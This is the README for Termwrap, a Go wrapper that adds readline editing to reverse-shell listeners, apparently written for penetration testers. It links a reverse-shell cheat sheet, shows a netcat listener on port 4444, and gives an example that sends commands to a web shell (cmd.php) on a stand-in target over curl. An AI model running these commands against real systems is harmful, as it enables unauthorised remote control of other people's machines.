Termwrap
========
Termwrap is a small program to provide readline-like functionality to a child
program's stdio.  Heavily inspired by (ok, a typical Go knockoff of)
https://github.com/hanslub42/rlwrap.

Under the hood, it wraps the child program's stdio with Go's SSH library's
`terminal` package: https://godoc.org/golang.org/x/crypto/ssh/terminal.

Its intent is to make the local end of
[oneliner shells](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
a little nicer to use in situations where rlwrap isn't available.

For legal use only.

Quickstart
----------
```bash
go get github.com/magisterquis/termwrap
termwrap nc -nvlp 4444
```
On a linux box, listens for a connection to port 4444.

Prompt
------
In situations where no prompt is otherwise available, the `-p` flag may be used
to print one locally.
```bash
termwrap -p 'curl> ' /bin/sh -c 'while read line; do curl -svLk "https://target.com/cmd.php?c=$line"; done'
curl> ls -a
.
..
cmd.php
index.html
curl> 
```

Exiting
-------
If the input line is empty, `Ctrl+D` (EOF) or `Ctrl+C` (Not SIGINT in this
case) will terminate the program.  A line can be cleared with `Ctrl+U` or
`Ctrl+C`.  Usually two `Ctrl+C`s are enough to terminate Termwrap.  If
termwrap's child process doesn't watch for EOFs on stdin, it may be necessary
to kill the child process manually.

If the terminal is in a strange state (technically in raw mode) on exit, the
`reset` command is usually sufficient to restore it.

Tab-Completion
--------------
Rudimentary tab completion can be enabled by giving termwap the name of a file
with completion words with the `-t` flag.  This file should have one word per
line.

Windows
-------
Should probably work.  Binaries available upon request.
